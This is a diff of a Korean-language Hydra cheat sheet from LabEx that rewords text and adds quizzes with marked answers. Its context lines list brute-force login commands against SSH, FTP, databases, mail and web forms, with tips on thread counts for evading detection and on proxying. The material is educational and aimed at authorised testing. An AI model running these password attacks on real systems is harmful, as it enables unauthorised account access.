@@ -1,6 +1,6 @@
 ---
-title: 'Hydra 치트 시트'
-description: '필수 명령어, 개념 및 모범 사례를 다루는 포괄적인 치트 시트로 Hydra 를 학습하세요.'
+title: 'Hydra 치트 시트 | LabEx'
+description: '포괄적인 치트 시트로 Hydra 비밀번호 크래킹을 학습하세요. 무차별 대입 공격, 비밀번호 감사, 보안 테스트, 인증 프로토콜 및 침투 테스트 도구에 대한 빠른 참조 자료입니다.'
 pdfUrl: '/cheatsheets/pdf/hydra-cheatsheet.pdf'
 ---
 
@@ -12,10 +12,10 @@ Hydra 치트 시트
 
 <base-disclaimer>
 <base-disclaimer-title>
-<a target="_blank" href="https://labex.io/ko/learn/hydra">핸즈온 실습으로 Hydra 배우기</a>
+<a target="_blank" href="https://labex.io/ko/learn/hydra">핸즈온 랩으로 Hydra 학습하기</a>
 </base-disclaimer-title>
 <base-disclaimer-content>
-핸즈온 실습과 실제 시나리오를 통해 Hydra 암호 크래킹 및 침투 테스트를 학습하세요. LabEx 는 프로토콜 공격, 웹 양식 악용, 성능 최적화 및 윤리적 사용을 다루는 포괄적인 Hydra 과정을 제공합니다. 승인된 보안 테스트 및 취약성 평가를 위한 무차별 대입 기술을 마스터하세요.
+핸즈온 랩과 실제 시나리오를 통해 Hydra 암호 크래킹 및 침투 테스트를 학습하세요. LabEx 는 프로토콜 공격, 웹 양식 악용, 성능 최적화 및 윤리적 사용을 다루는 포괄적인 Hydra 과정을 제공합니다. 승인된 보안 테스트 및 취약성 평가를 위한 무차별 대입 기술을 마스터하세요.
 </base-disclaimer-content>
 </base-disclaimer>
 
@@ -49,9 +49,24 @@ hydra -L users.txt -P passwords.txt target.com ssh
 hydra -l admin -p password123 192.168.1.100 ftp
 ```
 
+<BaseQuiz id="hydra-syntax-1" correct="B">
+  <template #question>
+    Hydra 에서 `-l` 과 `-L` 의 차이점은 무엇입니까?
+  </template>
+  
+  <BaseQuizOption value="A">`-l` 은 암호용이고, `-L` 은 사용자 이름용입니다</BaseQuizOption>
+  <BaseQuizOption value="B" correct>`-l` 은 단일 사용자 이름을 지정하고, `-L` 은 사용자 이름 목록 파일을 지정합니다</BaseQuizOption>
+  <BaseQuizOption value="C">차이점이 없습니다</BaseQuizOption>
+  <BaseQuizOption value="D">`-l` 은 소문자이고, `-L` 은 대문자입니다</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    `-l` 옵션은 단일 사용자 이름에 사용되며, `-L` 은 사용자 이름 목록이 포함된 파일을 지정하는 데 사용됩니다. 마찬가지로 `-p` 는 단일 암호에 사용되고 `-P` 는 암호 목록 파일에 사용됩니다.
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ### 핵심 옵션: `-l`, `-L`, `-p`, `-P`
 
-무차별 대입 공격을 위한 사용자 이름과 암호를 지정합니다.
+무차별 대입 공격에 사용할 사용자 이름과 암호를 지정합니다.
 
 ```bash
 # 사용자 이름 옵션
@@ -67,7 +82,7 @@ hydra -l admin -p password123 192.168.1.100 ftp
 
 ### 출력 옵션: `-o`, `-b`
 
-나중에 분석할 수 있도록 결과를 파일에 저장합니다.
+결과를 파일에 저장하여 나중에 분석합니다.
 
 ```bash
 # 결과를 파일에 저장
@@ -78,11 +93,26 @@ hydra -l admin -P passwords.txt target.com ssh -b json
 hydra -l admin -P passwords.txt target.com ssh -V
 ```
 
+<BaseQuiz id="hydra-output-1" correct="A">
+  <template #question>
+    `hydra -V`는 무엇을 합니까?
+  </template>
+  
+  <BaseQuizOption value="A" correct>자세한 진행 상황을 보여주는 자세한 출력을 활성화합니다</BaseQuizOption>
+  <BaseQuizOption value="B">단어 목록 파일을 확인합니다</BaseQuizOption>
+  <BaseQuizOption value="C">Hydra 버전을 표시합니다</BaseQuizOption>
+  <BaseQuizOption value="D">자세한 모드로만 실행됩니다</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    `-V` 플래그는 자세한 모드를 활성화하여 각 로그인 시도를 포함한 상세 출력을 표시하므로 암호 공격 중 진행 상황을 모니터링하고 문제를 디버깅하기가 더 쉽습니다.
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ## 프로토콜별 공격
 
 ### SSH: `hydra 대상 ssh`
 
-사용자 이름과 암호 조합으로 SSH 서비스를 공격합니다.
+사용자 이름과 암호 조합으로 SSH 서비스 공격.
 
 ```bash
 # 기본 SSH 공격
@@ -95,9 +125,24 @@ hydra -l admin -P passwords.txt 192.168.1.100 -s 2222 ssh
 hydra -l root -P passwords.txt -t 6 ssh://192.168.1.100
 ```
 
+<BaseQuiz id="hydra-ssh-1" correct="C">
+  <template #question>
+    Hydra 에서 `-s` 플래그는 무엇을 합니까?
+  </template>
+  
+  <BaseQuizOption value="A">서비스 유형을 설정합니다</BaseQuizOption>
+  <BaseQuizOption value="B">스텔스 모드를 활성화합니다</BaseQuizOption>
+  <BaseQuizOption value="C" correct>사용자 지정 포트 번호를 지정합니다</BaseQuizOption>
+  <BaseQuizOption value="D">스레드 수를 설정합니다</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    `-s` 플래그는 서비스가 표준 포트 22 가 아닌 다른 포트에서 실행될 때 사용자 지정 포트 번호를 지정합니다. 예를 들어, `-s 2222`는 포트 2222 의 SSH 를 대상으로 합니다.
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ### FTP: `hydra 대상 ftp`
 
-FTP 로그인 자격 증명을 무차별 대입합니다.
+FTP 로그인 자격 증명 무차별 대입 공격.
 
 ```bash
 # 기본 FTP 공격
@@ -110,7 +155,7 @@ hydra -l user -P passwords.txt -s 2121 192.168.1.100 ftp
 
 ### 데이터베이스 공격: `mysql`, `postgres`, `mssql`
 
-자격 증명 무차별 대입으로 데이터베이스 서비스를 공격합니다.
+자격 증명 무차별 대입 공격으로 데이터베이스 서비스 공격.
 
 ```bash
 # MySQL 공격
@@ -125,12 +170,12 @@ hydra -l admin -P passwords.txt 192.168.1.100 mongodb
 
 ### SMTP/이메일: `hydra 대상 smtp`
 
-이메일 서버 인증을 공격합니다.
+이메일 서버 인증 공격.
 
 ```bash
-# SMTP 무차별 대입
+# SMTP 무차별 대입 공격
 hydra -l admin -P passwords.txt smtp://mail.target.com
-# null/빈 암호 사용
+# 널/빈 암호 사용
 hydra -P passwords.txt -e ns -V -s 25 smtp.target.com smtp
 # IMAP 공격
 hydra -l user -P passwords.txt imap://mail.target.com
@@ -140,7 +185,7 @@ hydra -l user -P passwords.txt imap://mail.target.com
 
 ### HTTP POST 양식: `http-post-form`
 
-플레이스홀더 `^USER^` 및 `^PASS^`를 사용하여 HTTP POST 메서드로 웹 로그인 양식을 공격합니다.
+플레이스홀더 `^USER^` 및 `^PASS^`를 사용하여 HTTP POST 메서드로 웹 로그인 양식 공격.
 
 ```bash
 # 기본 POST 양식 공격
@@ -153,7 +198,7 @@ hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/admin:username=^U
 
 ### HTTP GET 양식: `http-get-form`
 
-POST 양식과 유사하지만 GET 요청을 대상으로 합니다.
+GET 요청을 대상으로 한다는 점을 제외하고 POST 양식과 유사합니다.
 
 ```bash
 # GET 양식 공격
@@ -164,7 +209,7 @@ hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/auth:user=^USER^&p
 
 ### HTTP 기본 인증: `http-get`/`http-post`
 
-HTTP 기본 인증을 사용하여 웹 서버를 공격합니다.
+HTTP 기본 인증을 사용하여 웹 서버 공격.
 
 ```bash
 # HTTP 기본 인증
@@ -177,7 +222,7 @@ hydra -l admin -P passwords.txt http-get://192.168.1.100/admin
 
 ### 고급 웹 공격
 
-CSRF 토큰 및 쿠키를 사용하여 복잡한 웹 애플리케이션을 처리합니다.
+CSRF 토큰 및 쿠키를 사용하여 복잡한 웹 애플리케이션 처리.
 
 ```bash
 # CSRF 토큰 처리 사용
@@ -199,7 +244,7 @@ hydra -l admin -P passwords.txt target.com ssh
 hydra -l admin -P passwords.txt -t 4 target.com ssh
 # 고성능 공격 (주의해서 사용)
 hydra -l admin -P passwords.txt -t 64 target.com ssh
-# 보수적 스레딩 (탐지 방지)
+# 보수적인 스레딩 (탐지 방지)
 hydra -l admin -P passwords.txt -t 1 target.com ssh
 ```
 
@@ -218,7 +263,7 @@ hydra -l admin -P passwords.txt -W 5 target.com ssh
 
 ### 여러 대상: `-M` (대상 파일)
 
-파일에 지정하여 여러 호스트를 공격합니다.
+파일에 지정하여 여러 호스트 공격.
 
 ```bash
 # 대상 파일 생성
@@ -227,13 +272,13 @@ echo "192.168.1.101" >> targets.txt
 echo "192.168.1.102" >> targets.txt
 # 여러 대상 공격
 hydra -L users.txt -P passwords.txt -M targets.txt ssh
-# 대상별 사용자 지정 스레딩
+# 대상별 사용자 지정 스레딩 사용
 hydra -L users.txt -P passwords.txt -M targets.txt -t 2 ssh
 ```
 
 ### 재개 및 중지 옵션
 
-중단된 공격을 재개하고 중지 동작을 제어합니다.
+중단된 공격 재개 및 중지 동작 제어.
 
 ```bash
 # 첫 번째 성공 후 중지
@@ -251,7 +296,7 @@ hydra -l admin -P passwords.txt -I restore.txt target.com ssh
 추가 암호 변형을 자동으로 테스트합니다.
 
 ```bash
-# null 암호 테스트
+# 널 암호 테스트
 hydra -l admin -e n target.com ssh
 # 사용자 이름을 암호로 테스트
 hydra -l admin -e s target.com ssh
@@ -263,7 +308,7 @@ hydra -l admin -e nsr -P passwords.txt target.com ssh
 
 ### 콜론 구분 형식: `-C`
 
-공격 시간을 줄이기 위해 사용자 이름:암호 조합을 사용합니다.
+공격 시간을 줄이기 위해 사용자 이름:암호 조합 사용.
 
 ```bash
 # 자격 증명 파일 생성
@@ -277,7 +322,7 @@ hydra -C creds.txt target.com ssh
 
 ### 프록시 지원: `HYDRA_PROXY`
 
-환경 변수를 사용하여 프록시 서버를 통해 공격합니다.
+환경 변수를 사용하여 프록시 서버를 통해 공격.
 
 ```bash
 # HTTP 프록시
@@ -291,7 +336,7 @@ export HYDRA_PROXY=socks5://proxy.example.com:1080
 
 ### 암호 목록 최적화: `pw-inspector`
 
-pw-inspector 를 사용하여 정책에 따라 암호 목록을 필터링합니다.
+정책에 따라 암호 목록을 필터링하기 위해 pw-inspector 사용.
 
 ```bash
 # 암호 필터링 (최소 6자, 2개 문자 클래스)
@@ -309,21 +354,21 @@ cat passwords.txt | sort | uniq > unique_passwords.txt
 Hydra 는 합법적으로 또는 불법적으로 사용될 수 있습니다. 무차별 대입 공격을 수행하기 전에 적절한 권한과 승인을 받으십시오.
 
 ```text
-명시적 승인을 얻은 시스템에서만 공격을 수행하십시오
-항상 시스템 소유자 또는 관리자로부터 명시적인 승인을 받았는지 확인하십시오
-규정 준수를 위해 모든 테스트 활동을 문서화하십시오
-승인된 침투 테스트 중에만 사용하십시오
-무단 액세스 시도에 절대 사용하지 마십시오
+승인된 권한을 얻은 후에만 시스템에 대한 공격 수행
+항상 시스템 소유자 또는 관리자로부터 명시적인 승인을 받았는지 확인
+규정 준수를 위해 모든 테스트 활동 문서화
+승인된 침투 테스트 중에만 사용
+무단 액세스 시도에 절대 사용하지 않음
 ```
 
 ### 방어 조치
 
-강력한 암호와 정책으로 무차별 대입 공격으로부터 방어합니다.
+강력한 암호 및 정책으로 무차별 대입 공격 방어.
 
 ```text
 실패 시도 후 계정을 일시적으로 잠그는 계정 잠금 정책 구현
 다단계 인증 (MFA) 사용
-자동화 도구를 방지하기 위해 CAPTCHA 시스템 구현
+자동화 도구 방지를 위해 CAPTCHA 시스템 구현
 인증 시도 모니터링 및 로깅
 속도 제한 및 IP 차단 구현
 ```
@@ -333,11 +378,11 @@ Hydra 는 합법적으로 또는 불법적으로 사용될 수 있습니다. 무
 보수적인 설정으로 시작하고 투명성을 위해 모든 활동을 문서화합니다.
 
 ```text
-서비스 중단을 방지하기 위해 낮은 스레드 수로 시작하십시오
-대상 환경에 적합한 단어 목록을 사용하십시오
-가능한 경우 승인된 유지 관리 기간 동안 테스트하십시오
-테스트 중 대상 시스템 성능을 모니터링하십시오
-사고 대응 절차를 준비하십시오
+서비스 중단을 방지하기 위해 낮은 스레드 수로 시작
+대상 환경에 적합한 단어 목록 사용
+가능한 경우 승인된 유지 관리 기간 동안 테스트
+테스트 중 대상 시스템 성능 모니터링
+사고 대응 절차 준비
 ```
 
 ### 일반적인 사용 사례
@@ -356,7 +401,7 @@ Hydra 는 합법적으로 또는 불법적으로 사용될 수 있습니다. 무
 
 ### XHydra: GUI 인터페이스
 
-XHydra 는 명령줄 스위치 대신 GUI 를 통해 구성을 선택할 수 있는 Hydra 의 GUI 입니다.
+XHydra 는 명령줄 스위치 대신 GUI 를 통해 구성을 선택할 수 있도록 하는 Hydra 의 GUI 입니다.
 
 ```bash
 # XHydra GUI 실행
@@ -372,12 +417,12 @@ sudo apt install hydra-gtk
 
 ### Hydra Wizard: 대화형 설정
 
-간단한 질문을 통해 hydra 설정을 안내하는 대화형 마법사입니다.
+간단한 질문을 통해 hydra 설정을 안내하는 대화형 마법사.
 
 ```bash
 # 대화형 마법사 실행
 hydra-wizard
-# 마법사가 묻는 항목:
+# 마법사가 요청하는 항목:
 # 1. 공격할 서비스
 # 2. 공격할 대상
 # 3. 사용자 이름 또는 사용자 이름 파일
@@ -389,7 +434,7 @@ hydra-wizard
 
 ### 기본 암호 목록: `dpl4hydra`
 
-특정 브랜드 및 시스템에 대한 기본 암호 목록을 생성합니다.
+특정 브랜드 및 시스템에 대한 기본 암호 목록 생성.
 
 ```bash
 # 기본 암호 데이터베이스 새로 고침
@@ -406,7 +451,7 @@ dpl4hydra all
 
 ### 다른 도구와의 통합
 
-정찰 및 열거 도구와 Hydra 를 결합합니다.
+정찰 및 열거 도구와 Hydra 결합.
 
 ```bash
 # Nmap 서비스 검색과 결합
@@ -421,7 +466,7 @@ ls /usr/share/wordlists/metasploit/
 
 ### 일반적인 문제 및 해결 방법
 
-Hydra 사용 중 발생하는 일반적인 문제를 해결합니다.
+Hydra 사용 중 발생하는 일반적인 문제 해결.
 
 ```bash
 # 연결 시간 초과 오류
@@ -461,13 +506,13 @@ hydra -l admin -P passwords.txt target.com ssh -o results.txt
 hydra -l admin -P passwords.txt target.com ssh -b json -o results.json
 # 디버깅을 위한 자세한 출력
 hydra -l admin -P passwords.txt target.com ssh -V
-# 성공 전용 출력
+# 성공만 출력
 hydra -l admin -P passwords.txt target.com ssh | grep "password:"
 ```
 
 ### 리소스 모니터링
 
-공격 중 시스템 및 네트워크 리소스를 모니터링합니다.
+공격 중 시스템 및 네트워크 리소스 모니터링.
 
 ```bash
 # CPU 사용량 모니터링
